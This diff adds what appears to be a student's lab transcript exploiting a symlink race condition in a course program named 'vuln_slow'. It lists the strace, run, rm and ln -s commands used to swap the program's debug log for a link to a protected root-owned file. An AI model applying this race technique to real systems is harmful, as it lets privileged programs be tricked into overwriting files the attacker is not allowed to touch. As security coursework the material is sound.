@@ -1,0 +1,25 @@
+Commands used [Transcript]: 
+
+
+>>>strace ./vuln_slow 3 "message" 
+==> This command was used to trace through the code to find out the output file of program which came out to be "/home/inoroot/.debug_log"
+Output = The whole strace output its too long to include it in here :)
+
+
+>>>./vuln_slow 60 "message sent" 
+==> Then we run the program with the arguments 60 and “message sent” respectively. This gives us just the right amount of time to be able to change the output file of the  program using the next two commands.
+Output = Sleeping for 180 seconds.
+		 writing debug message.
+		 Goodbye!
+
+
+>>>rm /home/inoroot/.debug_log 
+==> This command is used while the program is running so we delete the original output file.
+Output = not output just removes the debug_log file
+
+
+>>>ln -s /A2/Racing/Slow/root_file /home/inoroot/.debug_log 
+==> After deleting the original output file, we replace it with a symbolic link to root_file which is out desired destination. 
+Output = Again, not output, just links the two files
+
+
